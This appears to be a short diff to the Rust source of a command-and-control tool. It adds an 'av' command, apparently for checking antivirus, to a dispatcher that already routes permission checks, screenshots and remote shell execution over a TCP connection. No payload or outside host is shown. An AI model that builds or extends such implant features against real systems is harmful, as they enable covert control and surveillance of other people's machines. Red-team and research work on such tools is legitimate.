@@ -22,6 +22,7 @@ pub fn dispatch_client(instruct: Vec<&str>, conn: &mut TcpStream, state: &C2Stat
         Some(&"check") => client::system::check_permissions(conn),
         Some(&"display") => client::system::display(&instruct, conn),
         Some(&"screenshot") => client::system::screenshot(conn, state),
+        Some(&"av") => client::system::av(conn),
 
         // Shell mode
         Some(&"exec") => client::exec::run(conn, &instruct),
